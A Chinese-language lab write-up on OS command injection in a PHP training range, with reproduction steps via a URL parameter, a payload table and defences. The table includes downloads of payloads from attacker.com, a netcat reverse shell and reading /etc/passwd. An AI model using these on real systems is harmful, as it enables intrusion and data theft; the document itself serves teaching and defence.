## 1. 实验概述

通过本实验掌握**命令执行漏洞**（Command Injection）产生的原因和利用方法，体验典型靶场环境下的命令执行攻击过程。

- **实验类型**：靶场复现（基础）
- **漏洞类型**：OS命令执行
- **靶机环境**：Apache + PHP（Win10靶机）

## 3. 漏洞原理

利用系统命令执行漏洞可执行操作系统命令，从而获取服务器上的重要信息。PHP中若将用户输入直接拼接入`exec()`、`system()`、`shell_exec()`等命令执行函数，且未做严格过滤，即存在此漏洞。

---

## 4. 复现步骤

### 步骤1：访问目标页面

浏览器访问 `http://<ip>/os/system.php`，查看页面响应。

### 步骤2：查看当前文件绝对路径

```
?a=cd
```
访问 `http://<ip>/os/system.php?a=cd`，执行代码，查看当前文件的绝对路径。

### 步骤3：查看当前目录文件

```
?a=dir
```
访问 `http://<ip>/os/system.php?a=dir`，列出当前目录下的所有文件。

### 步骤4：查看系统所有用户

```
?a=net user
```
访问 `http://<ip>/os/system.php?a=net user`，列出系统所有用户账户。

### 步骤5：读取系统文件（hosts文件）

```
?a=type c:\windows\system32\drivers\etc\hosts
```
访问 `http://<ip>/os/system.php?a=type c:\windows\system32\drivers\etc\hosts`，读取hosts文件内容。

## 5. 常见命令执行利用payload

### Windows

| 命令 | 说明 |
|------|------|
| `whoami` | 查看当前用户权限 |
| `net user` | 列出所有用户 |
| `ipconfig /all` | 查看网络配置 |
| `type C:\Windows\System32\drivers\etc\hosts` | 读取系统文件 |
| `dir C:\` | 列出盘符目录 |
| `certutil -urlcache -f http://attacker.com/payload.exe` | 下载工具 |

### Linux

| 命令 | 说明 |
|------|------|
| `whoami` | 查看当前用户 |
| `cat /etc/passwd` | 读取密码文件 |
| `ifconfig` | 查看网络配置 |
| `wget http://attacker.com/shell.sh` | 下载攻击脚本 |
| `nc -e /bin/sh attacker.com 4444` | 反弹Shell |

---

## 6. 防御方案

1. **输入过滤**：严格过滤用户输入，禁止`;`、`|`、`&`、`$()`、反引号等命令分隔符
2. **避免命令执行函数**：尽量避免使用`exec()`、`system()`、`shell_exec()`、`passthru()`、`popen()`
3. **参数化**：若必须执行命令，使用白名单方式限制可执行命令范围
4. **权限最小化**：Web服务运行在低权限账户，限制能访问的系统资源
